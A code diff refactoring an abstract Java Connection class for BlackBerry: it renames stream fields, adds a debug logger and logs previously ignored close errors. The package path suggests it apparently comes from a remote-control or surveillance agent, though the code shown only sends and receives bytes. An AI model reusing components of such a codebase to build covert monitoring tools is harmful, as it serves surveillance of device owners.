@@ -14,45 +14,52 @@ import java.io.IOException;
 import javax.microedition.io.StreamConnection;
 
 import com.ht.rcs.blackberry.utils.Check;
+import com.ht.rcs.blackberry.utils.Debug;
+import com.ht.rcs.blackberry.utils.DebugLevel;
 
 public abstract class Connection {
-    protected DataInputStream in_;
-    protected DataOutputStream out_;
-    protected StreamConnection connection_ = null;
+    protected static Debug debug = new Debug("Connection", DebugLevel.VERBOSE);
+    
+    protected DataInputStream in;
+    protected DataOutputStream out;
+    protected StreamConnection connection = null;
 
-    protected boolean connected_ = false;
+    protected boolean connected = false;
 
     public abstract boolean connect();
 
     public synchronized void disconnect() {
-        if (connected_) {
-            connected_ = false;
-            if (in_ != null) {
+        if (connected) {
+            connected = false;
+            if (in != null) {
                 try {
-                    in_.close();
+                    in.close();
                 } catch (IOException e) {
+                    debug.error(e.toString());
                 }
             }
 
-            if (out_ != null) {
+            if (out != null) {
                 try {
-                    out_.close();
+                    out.close();
                 } catch (IOException e) {
+                    debug.error(e.toString());
                 }
             }
 
-            if (connection_ != null) {
+            if (connection != null) {
                 try {
-                    connection_.close();
+                    connection.close();
                 } catch (IOException e) {
+                    debug.error(e.toString());
                 }
             }
 
         }
 
-        in_ = null;
-        out_ = null;
-        connection_ = null;
+        in = null;
+        out = null;
+        connection = null;
     }
 
     protected abstract void error(String string);
@@ -60,13 +67,13 @@ public abstract class Connection {
     public abstract boolean isActive();
 
     public synchronized byte[] receive(int length) throws IOException {
-        if (connected_) {
-            Check.requires(in_ != null, "null in_");
+        if (connected) {
+            Check.requires(in != null, "null in_");
 
             // Create an input array just big enough to hold the data
             // (we're expecting the same string back that we send).
             byte[] buffer = new byte[length];
-            in_.readFully(buffer);
+            in.readFully(buffer);
 
             // Check.ensures(read == buffer.length, "Wrong read len: "+read);
 
@@ -88,11 +95,11 @@ public abstract class Connection {
      */
     public synchronized boolean send(byte[] data) throws IOException {
 
-        if (connected_) {
-            Check.requires(out_ != null, "null out_");
+        if (connected) {
+            Check.requires(out != null, "null out_");
 
             int length = data.length;
-            out_.write(data, 0, length);
+            out.write(data, 0, length);
 
             return true;
         } else {
